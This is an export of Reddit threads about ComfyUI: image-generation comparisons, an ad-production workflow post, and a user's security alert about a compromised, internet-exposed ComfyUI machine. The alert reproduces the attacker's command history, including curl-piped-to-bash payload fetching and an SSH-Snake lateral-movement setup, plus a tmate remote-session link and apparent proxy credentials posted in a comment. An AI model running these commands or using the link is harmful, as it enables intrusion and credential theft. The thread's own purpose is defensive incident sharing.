              "text": "here the OG Post with WF\n\n[https://www.reddit.com/r/StableDiffusion/comments/1qg5ph5/flux\\_2\\_klein\\_4b\\_vs\\_9b\\_multi\\_camera\\_angles\\_one/](https://www.reddit.com/r/StableDiffusion/comments/1qg5ph5/flux_2_klein_4b_vs_9b_multi_camera_angles_one/)",
              "score": 11,
              "created_utc": "2026-01-20 09:56:50",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0l0860",
          "author": "Mirandah333",
          "text": "Wow, all from the 1st image?",
          "score": 5,
          "created_utc": "2026-01-20 01:06:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0l9c2i",
          "author": "NessLeonhart",
          "text": "None of those look real though. \n\nI think we‚Äôre still a couple generations away from realism",
          "score": 11,
          "created_utc": "2026-01-20 01:56:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ndesf",
              "author": "blownawayx2",
              "text": "I know I may be in the minority, but before AI image generation existed, if people were to show me these images, I‚Äôd say they looked great and wouldn‚Äôt question if they were real or not. Magazines forever have been modifying photos beyond what we‚Äôd find in reality. So, what am I missing here in these photos that immediately implies for you that they don‚Äôt look real? They look real enough to me‚Ä¶",
              "score": 7,
              "created_utc": "2026-01-20 11:21:28",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0o7mcb",
                  "author": "NessLeonhart",
                  "text": "That‚Äôs shocking to me. This isn‚Äôt passable at all, to me. Not the entire image, but the face, mostly. It is not her. It‚Äôs like a wax statue of her; looks like her but you know that it‚Äôs not somehow.\n\nThe lifeless pose, also.",
                  "score": 3,
                  "created_utc": "2026-01-20 14:33:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0ljr1h",
          "author": "maxtablets",
          "text": "the portrait on at least 3 of those is way off, unfortunately. Still cool attempt though",
          "score": 3,
          "created_utc": "2026-01-20 02:53:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0l2m0j",
          "author": "Libertalias",
          "text": "Workflow?",
          "score": 5,
          "created_utc": "2026-01-20 01:19:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0l8cri",
              "author": "PeterTheMeterMan",
              "text": "Someone on discord said this morning, \"9B even works with the muti-angle node with NO LORAS! unlike qwen-edit which i am officially retiring it by deleting it from my drive\"  \n  \nSo, I would say try it with this node: https://github.com/jtydhr88/ComfyUI-qwenmultiangle  \n  \nDoes look cool, so I shall try it myself later when I have time.",
              "score": 8,
              "created_utc": "2026-01-20 01:51:12",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o0l4hzi",
              "author": "RigelXVI",
              "text": "The tag says No Workflow",
              "score": -4,
              "created_utc": "2026-01-20 01:29:52",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0l4tkd",
          "author": "Cautious_Schedule849",
          "text": "Nice work!\nWith Lora or just prompt ?",
          "score": 2,
          "created_utc": "2026-01-20 01:31:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0lre26",
          "author": "GravitationalGrapple",
          "text": "Close, but middle row left image has 2 vials next to her holster that are not in the other images. As others have said it feels ‚Äúoff‚Äù too.",
          "score": 2,
          "created_utc": "2026-01-20 03:36:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0m1u1a",
          "author": "FitContribution2946",
          "text": "I haven't had anywhere near this quality with Klein. Klein has been basically garbage as far as I've seen. This must be a different workflow than what company was putting out just a day ago",
          "score": 2,
          "created_utc": "2026-01-20 04:38:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0n4yp9",
          "author": "Yattagor",
          "text": "Not bad for a first attempt! It must be said that Ella Purnell looks prettier in real life! Here she looks a little ugly!",
          "score": 2,
          "created_utc": "2026-01-20 10:06:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0lglun",
          "author": "InternationalOne2449",
          "text": "Qwen can do the same.",
          "score": 1,
          "created_utc": "2026-01-20 02:36:03",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ly8e7",
          "author": "nutrunner365",
          "text": "Still doesn't capture the likeness perfectly. The from above one is even quite bad.",
          "score": 1,
          "created_utc": "2026-01-20 04:15:54",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0mdbp0",
          "author": "elvinjoker",
          "text": "Wait rtx 2080? Do u have huge vram?",
          "score": 1,
          "created_utc": "2026-01-20 05:59:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0mkde1",
          "author": "No-Location6557",
          "text": "is it better than qwen 2511 multi angle?",
          "score": 1,
          "created_utc": "2026-01-20 06:56:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0mtjer",
          "author": "JohnSnowHenry",
          "text": "Not as good as qwen multi but dammm it‚Äôs also really good!\n\nPlease please release Omni so actually good Lora‚Äôs can be made",
          "score": 1,
          "created_utc": "2026-01-20 08:18:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0qk0ri",
          "author": "superstarbootlegs",
          "text": "how long to finish? that is best I seen from Klein so far. QWEN 2511 also does a good one with camera angle nodes how did you ask for the angles?",
          "score": 1,
          "created_utc": "2026-01-20 21:06:15",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0m5873",
          "author": "Upset-Virus9034",
          "text": "Can you share your wf please",
          "score": 1,
          "created_utc": "2026-01-20 05:00:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ms8oj",
          "author": "TheTimster666",
          "text": "Most of them are still  off. The human eye and brain is optimized to spot familiar faces, and the smallest deviation will alert us.",
          "score": 1,
          "created_utc": "2026-01-20 08:06:30",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qhuqwr",
      "title": "Big thanks to the ComfyUI community! Just wrapped a national TV campaign (La Centrale) using a hybrid 3D/AI workflow.",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qhuqwr/big_thanks_to_the_comfyui_community_just_wrapped/",
      "author": "cheerldr_",
      "created_utc": "2026-01-20 07:35:46",
      "score": 121,
      "num_comments": 30,
      "upvote_ratio": 0.91,
      "text": "Hey everyone,\n\nI wanted to share a quick win and, more importantly, a **huge thank you to this community**. I‚Äôve been lurking and learning here for a while, and I honestly couldn't have pulled this off without the incredible nodes, workflows, and troubleshooting tips shared by everyone here.\n\nI recently had the chance to integrate ComfyUI into a \"real-world\" professional production for **La Centrale** (a major French automotive marketplace), working alongside agencies BETC and Bloom.\n\n**The challenge:** We had to bring a saga of 25 custom-designed cars to life for over 10 different commercials in a very tight 4-week window.\n\nhttps://reddit.com/link/1qhuqwr/video/vhhgg7rajgeg1/player\n\n**The process:** To meet the brand's high standards, I deployed a hybrid pipeline: **3D for the structure/consistency and ComfyUI for the design, textures, and realism.** This allowed us to stay incredibly agile while maintaining a level of detail that traditional 3D alone wouldn't have reached in that timeframe.\n\nIt‚Äôs definitely not \"perfect,\" and there‚Äôs always room for improvement, but it‚Äôs a solid proof of concept that our workflows are ready for high-stakes professional advertising.\n\nThanks again for being such an inspiring hub of innovation. This is only the beginning! üçøüí•\n\n*(If anyone is curious about the specific nodes or how I handled the 3D-to-AI pass to keep the cars consistent, I‚Äôm happy to answer questions in the comments!)*\n\nmore details about this project : [https://www.surrendr.studio/work/la-centrale-ai](https://www.surrendr.studio/work/la-centrale-ai)  \n",
      "is_original_content": false,
      "link_flair_text": "News",
      "permalink": "https://reddit.com/r/comfyui/comments/1qhuqwr/big_thanks_to_the_comfyui_community_just_wrapped/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o0nbzj6",
          "author": "MisundaztoodMiller",
          "text": "How did you maintain accuracy per vehicle design?how did you transpose the design of the vehicle onto the 3d model block out?",
          "score": 11,
          "created_utc": "2026-01-20 11:09:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ncexn",
              "author": "cheerldr_",
              "text": "I mainly used it for the animation to keep it consistent. AI is still a bit random when trying to animate 25 vehicles, and this method allowed me to get exactly the animation I wanted.",
              "score": 5,
              "created_utc": "2026-01-20 11:13:06",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0nlhwe",
                  "author": "MisundaztoodMiller",
                  "text": "Yeah I get using the 3d model for the animation. I'm just wondering how you got the car design on to it. Did you have a side view photo graph of the car manufacturer/model of the car and got comfy to transpose it on to the animation?",
                  "score": 9,
                  "created_utc": "2026-01-20 12:23:28",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0orxwy",
                  "author": "TekaiGuy",
                  "text": "u/MisundaztoodMiller is asking about the \"texture\". Most current os models don't support generating the texture alongside the mesh so it's sort of a holy grail. Trellis can do it but it's not officially supported on comfy yet.",
                  "score": 1,
                  "created_utc": "2026-01-20 16:12:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0o9pq8",
          "author": "blastcat4",
          "text": "Great stuff! This is the kind of work that AI can be legitimately useful for, especially with tools like comfyui. Thanks for sharing this with us!",
          "score": 2,
          "created_utc": "2026-01-20 14:44:10",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0oj4q5",
              "author": "cheerldr_",
              "text": "Exactly ! üí•üî•",
              "score": 1,
              "created_utc": "2026-01-20 15:30:57",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0pt1x4",
          "author": "jefharris",
          "text": "Congrats!",
          "score": 2,
          "created_utc": "2026-01-20 19:01:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0n1sdq",
          "author": "Used-Ear-8780",
          "text": "Great job",
          "score": 6,
          "created_utc": "2026-01-20 09:36:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0nc5yp",
              "author": "cheerldr_",
              "text": "Thx !",
              "score": 2,
              "created_utc": "2026-01-20 11:10:57",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0n5spr",
          "author": "SEOldMe",
          "text": "Excellent!!! Bravo ‚òÜ‚òÜ‚òÜ‚òÜ‚òÜ",
          "score": 5,
          "created_utc": "2026-01-20 10:14:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ndz3h",
          "author": "_CreationIsFinished_",
          "text": "Some jealous \\*someone\\* had gone through and downvoted every post in the thread. What is up with some ppl here? XD",
          "score": 6,
          "created_utc": "2026-01-20 11:26:09",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0np97p",
              "author": "Grid421",
              "text": "Probably one of those \"AI steals and destroys the planet\" people. \n\nLoved seeing what OP did. It shows what's possible in the hands of talented people.",
              "score": 7,
              "created_utc": "2026-01-20 12:49:07",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0nkixx",
          "author": "Excellent_Koala769",
          "text": "Woah, that looks soo good.  I just started running comfyui workflows locally on my DGX Spark.  I have a couple questions if you don't mind.\n\n  \n1.  What hardware do you run your workflows on?\n\n2.  The cars look so real and high quality.  I would love to be able to generate a moving hyper realistic logo.  Kind of how you made the cars drop down.  Could you imagine making this logo flying in from the left side?  \n\n3.  Do you have any example workflows I could attempt to do this on?\n\n  \nThanks!\n\nhttps://preview.redd.it/mhgh02fhxheg1.png?width=1563&format=png&auto=webp&s=69742b1490fa8dfb61c2da86475390fede692026",
          "score": 3,
          "created_utc": "2026-01-20 12:16:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0obqa5",
          "author": "PestBoss",
          "text": "I'm confused about the \"real-world\" bit of the project, and what the brief was.\n\nIn the end ComfyUI is production ready now, it was 12 months ago or longer for all I know.\n\n\nI'm not sure a client cares how you eventually get to your end product. I've spent 20 years working professionally in businesses and for myself and I'd say not one said \"how\", they just said get it done.\n\nNow I'm sure some big companies might be weird about trying new ideas and stuff, and just like to have a standardised template and workflows, but an absolute ton of businesses will be as creative with their tools and workflows as they will the actual outputs :D\n\n\nNice work in any case :D",
          "score": 1,
          "created_utc": "2026-01-20 14:54:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0oj0mc",
              "author": "cheerldr_",
              "text": "Haha, I totally hear you! After 14 years in the game, I‚Äôve realized that working directly with agencies and clients is a whole different beast compared to running in post-production studio.\nWhen you‚Äôre in the driver‚Äôs seat of a studio, you have your own flow, but with direct clients, it‚Äôs all about hitting that budget without sacrificing the 'wow' factor.\n\n For this project, the real challenge was rock-solid consistency, keeping the same lighting, the same energy, and the same art direction across every single frame and asset.\n\n Honestly, even with a full-blown 3D pipeline, that‚Äôs a mountain to climb!\n\nSo, I turned to AI primarily as a smart way to bridge that budget gap. My goal was to take those tools and 'tame' them until the output was 100% production-ready in my little studio\n\nIt‚Äôs all about finding that sweet spot between creative tech and real-world constraints",
              "score": 6,
              "created_utc": "2026-01-20 15:30:24",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0oxmb0",
                  "author": "PestBoss",
                  "text": "Right, yeah the consistency factor is certainly a challenge even with classic workflows/tools.\n\nOK so from that point of view I expect you've succeeded well enough given the examples.\n\nI often find things like seed alone can kinda give 'similar' looks/styles, even with changing prompts. I wonder if that's been a thing you've noticed on this project?",
                  "score": 1,
                  "created_utc": "2026-01-20 16:38:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0ohmtp",
          "author": "divyanshii03",
          "text": "This is soo awesome!! Finally someone is getting some awesome results on 3D side on node based platform.",
          "score": 1,
          "created_utc": "2026-01-20 15:23:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0oiar0",
          "author": "Enashka_Fr",
          "text": "Pas mal du tout ! So if I understand correctly, the cars don't exist at all in the real world, and were entirely json prompted? Wan 2.2 and Qwen for subsequent edit? Would you say json format was essential at least for that pipe (I hear diverging views). Bravo ;)",
          "score": 1,
          "created_utc": "2026-01-20 15:26:58",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0ood4k",
          "author": "themilush",
          "text": "great job on this project and can't wait to learn more about it... what intregues me is how you've used the 3d animation from blender to guide the AI generation (if that was the workflow), can you elaborate more on that part of the process?",
          "score": 1,
          "created_utc": "2026-01-20 15:55:38",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0opyxd",
              "author": "themilush",
              "text": "I've noticed in the video showcase you've lost the reflection animation on the car from comfy to after effects, just curious on what happened there :)",
              "score": 1,
              "created_utc": "2026-01-20 16:03:06",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o0nm0kc",
          "author": "76vangel",
          "text": "Congratulations, well done. I‚Äôm interested in the blender 3d to refine with comfy phase. What model, technique did you use here? First frame + Animate/Vace? Z from blender? Could you please elaborate? Great work!",
          "score": 1,
          "created_utc": "2026-01-20 12:27:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0oprz9",
              "author": "cheerldr_",
              "text": "Used only wan 2.2 for img generation, hyuan for 3d meshing and wan2.2 for video generation : img to video driven by video",
              "score": 2,
              "created_utc": "2026-01-20 16:02:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0oigsm",
          "author": "divyanshii03",
          "text": "curious how you approached it. Would you be open to sharing your workflow or a detailed explanation on node setup?",
          "score": 1,
          "created_utc": "2026-01-20 15:27:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0opgzy",
              "author": "cheerldr_",
              "text": "I'd love to, but it's a bit of a complex beast because it relies heavily on local custom scripts that bridge several tools together\n\nHere‚Äôs the high-level breakdown of the pipeline:\n\nInitial Gen: I start with Qwen Edit to generate the base images.\n\nClient Approval: Once the client validates the look, my script takes over.\n\n3D Mesh: The script calls ComfyUI and Huyuan to generate a 3D mesh directly from that validated 2D image.\n\nBlender Integration: My script then pulls that 3D model into Blender and applies a custom auto-rig we built.\n\nMotion Approval: We get the animation/movement approved by the client within Blender first.\n\nFinal Render: Once the motion is locked, it goes back into ComfyUI via Wan 2.1 for the final video render.\n\nSince it involves a lot local scripts ( simple in .bat)  handle the handoffs between Blender and Comfy, the node setup itself is actually the simple part, the magic is really in the automation! :D\"",
              "score": 9,
              "created_utc": "2026-01-20 16:00:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0ot327",
                  "author": "divyanshii03",
                  "text": "Super helpful, I wasn‚Äôt sure about the blender integration. Thanks a lot! :)",
                  "score": 1,
                  "created_utc": "2026-01-20 16:17:27",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o0ye87g",
                  "author": "Queasy-Carrot-7314",
                  "text": "How did you clean up and separate the 3d mesh generated by hunyuan. It generally creates a single mesh for the whole scene. That's not really usable for animation.\n\nI see in your video that you have a much nicer mesh separated into parts. How did you achieve that ?",
                  "score": 1,
                  "created_utc": "2026-01-22 00:03:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0pu4l1",
          "author": "Neither-Apricot-1501",
          "text": "Absolutely incredible work! The hybrid workflow sounds like a game-changer for tight deadlines. Would love to hear more about your AI-to-3D integration techniques!",
          "score": 1,
          "created_utc": "2026-01-20 19:06:26",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qn4w1j",
      "title": "I think my comfyui has been compromised, check in your terminal for messages like this",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "author": "Bender1012",
      "created_utc": "2026-01-26 03:34:04",
      "score": 111,
      "num_comments": 35,
      "upvote_ratio": 0.95,
      "text": "**Root cause has been found, see my latest update at the bottom**\n\nThis is what I saw in my comfyui Terminal that let me know something was wrong, as I definitely did not run these commands:\n\n     got prompt\n    \n    --- –≠—Ç–∞–ø 1: –ü–æ–ø—ã—Ç–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä–æ–∫—Å–∏ ---\n    \n    –ü–æ–ø—ã—Ç–∫–∞ 1/3: –ó–∞–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ 'requests' —Å –ø—Ä–æ–∫—Å–∏...\n    \n    –ê—Ä—Ö–∏–≤ —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω. –ù–∞—á–∏–Ω–∞—é —Ä–∞—Å–ø–∞–∫–æ–≤–∫—É...\n    \n    ‚úÖ TMATE READY\n    \n    \n    SSH: ssh 4CAQ68RtKdt5QPcX5MuwtFYJS@nyc1.tmate.io\n    \n    \n    WEB: https://tmate.io/t/4CAQ68RtKdt5QPcX5MuwtFYJS\n    \n    Prompt executed in 18.66 seconds \n\nCurrently trying to track down what custom node might be the culprit... this is the first time I have seen this, and all I did was run git pull in my main comfyui directory yesterday, not even update any custom nodes.\n\n**UPDATE:**\n\nIt's pretty bad guys. I was able to see all the commands the attacker ran on my system by viewing my .bash_history file, some of which were these:\n\n    apt install net-tools\n    curl -sL https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomments.sh -o snake_original.sh\n    TMATE_INSTALLER_URL=\"https://pastebin.com/raw/frWQfD0h\"\n    PAYLOAD=\"curl -sL ${TMATE_INSTALLER_URL} | sed 's/\\r$//' | bash\"\n    ESCAPED_PAYLOAD=${PAYLOAD//|/\\\\|}\n    sed \"s|custom_cmds=()|custom_cmds=(\\\"${ESCAPED_PAYLOAD}\\\")|\" snake_original.sh > snake_final.sh\n    bash snake_final.sh 2>&1 | tee final_output.log\n    history | grep ssh\n\nBasically looking for SSH keys and other systems to get into. They found my keys but fortunately all my recent SSH access was into a tiny server hosting a personal vibe coded game, really nothing of value. I shut down that server and disabled all access keys. Still assessing, but this is scary shit.\n\n**UPDATE 2**\n\nAccording to Claude, the most likely attack vector was the custom node **[comfyui-easy-use](https://github.com/yolain/ComfyUI-Easy-Use)**. Apparently there is the capability of remote code execution in that node. Not sure how true that is, I don't have any paid versions of LLMs. \n\nMore importantly, I did some dumb shit to allow this. I always start comfyui with the --listen flag, so I can check on my gens from my phone while I'm elsewhere in my house. Normally that would be restricted to devices on your local network, but separately, apparently I enabled DMZ host on my router for my PC. If you don't know, DMZ host is a router setting that basically opens every port on one device to the internet. This was handy back in the day for getting multiplayer games working without having to do individual port forwarding; I must have enabled it for some game at some point. This essentially opened up my comfyui to the entire internet whenever I started it... presumably there are people out there just scanning IP ranges for port 8188 looking for victims, and they found me. \n\n**Lesson: Do not use the --listen flag in conjunction with DMZ host!**",
      "is_original_content": false,
      "link_flair_text": "Security Alert",
      "permalink": "https://reddit.com/r/comfyui/comments/1qn4w1j/i_think_my_comfyui_has_been_compromised_check_in/",
      "domain": "self.comfyui",
      "is_self": true,
      "comments": [
        {
          "id": "o1rd67p",
          "author": "alborden",
          "text": "I guess ComfyUI should probably add a built in security or antivirus feature to scan and prevent the install of nodes etc that have dodgy code.",
          "score": 56,
          "created_utc": "2026-01-26 04:17:17",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s04r0",
              "author": "_realpaul",
              "text": "With the speed that comfyui and its ecosystem are moving half the codebase is dodgy. Hell installing python packages without checking versions is already funky. \n\nBest to isolate it and dont grant any network and file access beyond the absolute necessary",
              "score": 16,
              "created_utc": "2026-01-26 07:01:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1s5r12",
                  "author": "JoelMahon",
                  "text": "yup, a sandbox / VM / air gapped type solution is basically the only viable one.",
                  "score": 1,
                  "created_utc": "2026-01-26 07:48:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1scvxo",
              "author": "TechnoByte_",
              "text": "That's a band-aid fix rather than a real security solution\n\nThey already do that, but it doesn't help at al\n\nThe only way to run ComfyUI securely is in a sandbox such as Docker",
              "score": 1,
              "created_utc": "2026-01-26 08:51:41",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rccsp",
          "author": "thenickdude",
          "text": "You shouldn't share those tmate links, because if the malware is still running then anybody can use that link to connect to your computer.",
          "score": 24,
          "created_utc": "2026-01-26 04:12:12",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rgvg1",
          "author": "chensium",
          "text": "Can OP let us know which node caused this?",
          "score": 25,
          "created_utc": "2026-01-26 04:40:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ri6f1",
              "author": "Bender1012",
              "text": "Haven't gotten there yet... busy doing damage control / blast radius assessment. This was in my WSL which I used to access work stuff...",
              "score": 15,
              "created_utc": "2026-01-26 04:49:25",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1rllpe",
                  "author": "chensium",
                  "text": "Oooh.¬† Ouch.¬† Ya definitely take care of business first.",
                  "score": 5,
                  "created_utc": "2026-01-26 05:12:11",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1rkfy3",
          "author": "Lightningstormz",
          "text": "Holy fuck, keep us updated good luck.",
          "score": 10,
          "created_utc": "2026-01-26 05:04:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1r7d21",
          "author": "nvmax",
          "text": "Here is the breakdown of what is happening:\n\n1. What is tmate?\ntmate is an open-source tool that creates a \"terminal sharing\" session. It establishes a secure tunnel from a local machine to the internet, allowing others to access that specific terminal remotely via SSH or a web browser.\n\n2. Breakdown of the Log\nThe \"Proxy\" Phase: The script first tried to download the necessary archive (the tmate binary) using a proxy, likely to bypass firewalls or network restrictions.\n\n‚úÖ TMATE READY: This means the program is now running and the tunnel is open.\n\nSSH Address: This is a direct command someone can paste into their terminal to take full control of that command line.\n\nWEB URL: This is a read/write link that allows anyone with the URL to view or interact with the terminal through a browser.\n\n3. Why is this used?\nLegitimate Use: Developers use it for remote pair programming or debugging code running on a remote server that doesn't have a public IP address.\n\nSecurity Risk: If you did not initiate this, this is a major red flag. This is a common technique used by hackers to establish a \"Reverse Shell.\" It gives them a permanent backdoor into the system to execute commands, steal data, or install malware.\n\n\n\nScrub your pc man, they installed some shit. do not use your pc you dont know what that package was or if it is sending them your files, shut down and wipe save nothing. \n\nyou clearly installed a node that was compromised and ran some malicious shit.",
          "score": 33,
          "created_utc": "2026-01-26 03:42:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1r8s5z",
              "author": "digiden",
              "text": "Is there a way to disable terminal sharing?",
              "score": 3,
              "created_utc": "2026-01-26 03:50:24",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1rbikw",
                  "author": "nvmax",
                  "text": "usually these types of packages are malware and have multiple points of intrusion the best way disconnect from the internet entirely on that pc.. all your data, logins, passwords are probably being stolen as you sit there typing on it.",
                  "score": 8,
                  "created_utc": "2026-01-26 04:06:59",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rbyxi",
                  "author": "guchdog",
                  "text": "Even if this is all true, this mean anything could have been ran and installed.  Removing it solves the security issue but they could have installed virus, malware, spyware, ransomware, whatever.",
                  "score": 4,
                  "created_utc": "2026-01-26 04:09:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1roucu",
          "author": "Tam1",
          "text": "Some more info for you on SSH Snake and what else it might have scanned and found:\nBash History:\tParses ~/.bash_history for previous ssh, scp, or rsync commands to find usernames and IPs.\nSSH Configs\t:Reads ~/.ssh/config to find host aliases and specific IdentityFile paths.\nNetwork Discovery:\tUses ip neigh (ARP) and getent to find other active devices on the local network.\nD-Block Scan:\tIf configured, it will \"fuzz\" the last octet of the current IP (e.g., 192.168.1.0-255) to find live hosts.\nHashed Hosts:\tIt even tries to crack/brute-force hashed entries in known_hosts by comparing them against discovered IPs.\n\nOn top of that the script is essentially fileless. It exists in memory (as a variable) and moves through SSH pipes without needing to be written to a permanent file on the target machine in many configurations. This means looking at file modifications alone may not help you chart the attack path. \n\nDo you have Defender running?\n\nThAat tmux script has hard coded credentials in it too: i76qPr:Lt1t3TZZhR, which means the person who wrote this is probably using a specific, private proxy infrastructure to \"tunnel\" out of your network and its running with -d to make it a hidden background session too so spotting if its active will be a challenge. \n\nWould be good to get a full list of all your nodes or extensions asap.",
          "score": 7,
          "created_utc": "2026-01-26 05:34:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rt2wy",
          "author": "prowacko",
          "text": "So you're saying having comfyui\\_easy-use in general was the cause for this? A lot of people have this node so wouldn't this be a wide spread issue? Or was it solely because you opened your ports and enabling DMZ?",
          "score": 5,
          "created_utc": "2026-01-26 06:05:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1rtknm",
              "author": "Bender1012",
              "text": "Combination of all 3. If you do not use the --listen flag and do not forward your comfyui port / DMZ host your PC, you should be fine.",
              "score": 5,
              "created_utc": "2026-01-26 06:09:34",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1ruro4",
                  "author": "ChromaBroma",
                  "text": "But is it node infected? I'm trying to determine if I should remove it.",
                  "score": 2,
                  "created_utc": "2026-01-26 06:18:48",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1rml26",
          "author": "Antique_Juggernaut_7",
          "text": "If you allow an advice for the future -- create a routine of always running ComfyUI (or anything that runs external code) inside a container.\n\nTo learn how to do it, LLMs are your friend. Just ask  ChatGPT what is Docker, how to install it in WSL2, and how to run a container for your ComfyUI folder path.\n\nIt takes 20 minutes to start and you'll likely never stop using it afterwards. It's safer and has the added benefit of you never worrying about breaking dependencies/python environments again.",
          "score": 8,
          "created_utc": "2026-01-26 05:18:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1robwp",
              "author": "WdPckr-007",
              "text": "I have been there just a fair advance on that path, if you use amd forget about containers its always 80% slower for some reason\n\nNvidia cont is as fast as in the host",
              "score": 1,
              "created_utc": "2026-01-26 05:31:03",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1rx3hs",
          "author": "Jealous_Piece_1703",
          "text": "Dear god not Easy use! Gotta check my system now!",
          "score": 5,
          "created_utc": "2026-01-26 06:36:57",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s4q4j",
              "author": "S7venE11even",
              "text": "Let us know if you find something please.",
              "score": 3,
              "created_utc": "2026-01-26 07:39:44",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1sak0w",
                  "author": "Jealous_Piece_1703",
                  "text": "I have old versions, did not update it, And no there is nothing sus happening from it in my old version.",
                  "score": 1,
                  "created_utc": "2026-01-26 08:30:33",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1s1qmy",
          "author": "SearchTricky7875",
          "text": "please dont install any custom node using claude code or any vibe coding tool, first check the custom node rating , popularity then only do install manually. I was victim of this, claude code just installed any node on my system, which someone created only to mine your gpu, there are many mining code spreading all accross github, claude code doesn't check for git stars n popularity, it matches the name n install it, it could be some mining code for sure, popular nodes are safe generally.\n\nI had a bad experience with claude code and last next js vulnerability, it istalled some code and my whole server was down with mining code, I delete one maware, it again got installed, the malware make copies in so many places you ll waste your days figuring it out where it existed, almost after 3 days I had to take backup n reinstall the whole server.",
          "score": 4,
          "created_utc": "2026-01-26 07:14:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1s6m46",
          "author": "GrapplingHobbit",
          "text": "What's the confidence level in it being the easy-use nodes?  That's a pretty popular and well-starred repository.",
          "score": 4,
          "created_utc": "2026-01-26 07:55:49",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1rn1o3",
          "author": "oasuke",
          "text": "Why would an attacker post their messages in the terminal for the user to see lol. Vibe coded malware?",
          "score": 5,
          "created_utc": "2026-01-26 05:22:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1s12v0",
              "author": "Carnildo",
